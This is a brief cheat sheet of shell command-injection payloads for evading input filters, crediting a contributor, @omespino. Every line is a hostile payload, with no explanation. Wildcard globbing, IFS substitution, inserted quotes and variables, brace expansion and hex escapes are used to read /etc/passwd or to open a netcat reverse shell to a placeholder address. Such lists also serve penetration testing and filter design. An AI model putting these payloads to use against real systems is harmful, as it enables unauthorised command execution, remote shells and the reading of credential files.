- /???/c?t /???/pa??wd   
- /???/n??t -e /???/b??h 127.0.0.1 2333      
- /b$6in/nc$6at -e /bi$6n/ba$6sh 127.0.0.1 2333   
- /b"in/n"c\at -e /b'in/ba's\h 127.0.0.1 2333    
- IFS=,;`cat<<<cat,/etc/passwd`

- cat$IFS/etc/passwd
- cat${IFS}/etc/passwd
- cat</etc/passwd                 
- {cat,/etc/passwd} OR {ls,-las,/var} with args
- X=$'cat\x20/etc/passwd'&&$X

thanks @omespino 
